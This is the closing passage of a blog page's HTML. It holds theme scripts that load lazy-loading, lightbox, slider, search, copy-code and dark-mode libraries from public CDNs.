        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.swiper-slide img, .gallery img ,#waline_container .vcontent img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || null
        }
      });
    })
  }
</script><script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          loop: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script><script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->
<script type="text/javascript" src="/js/darkmode.js"></script>
</div></body></html>
